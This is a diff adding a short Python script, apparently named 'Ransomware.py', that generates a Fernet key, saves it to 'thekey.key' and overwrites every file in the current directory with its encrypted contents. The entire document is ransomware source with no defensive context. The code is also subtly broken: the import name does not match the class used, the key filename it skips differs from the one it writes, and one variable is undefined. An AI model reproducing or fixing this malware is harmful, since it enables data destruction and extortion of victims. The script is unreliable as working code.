@@ -1,0 +1,21 @@
+import os
+from cryptography.fernet import fernet
+
+files = []
+
+for file in os.listdir():
+    if file == "Ransomware.py" or file == "theykey.key":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+    
+key = Fernet.generate_key()   
+with open('thekey.key', 'wb') as thekey:
+     thekey.write(key)
+     
+for file in files:
+    with open(file, 'rb') as currentfile:
+        info = thefile.read()
+    encrypted_info = Fernet(key).encrypt(info)
+    with open(file, 'wb') as currentfile:
+        currentfile.write(encrypted_info)
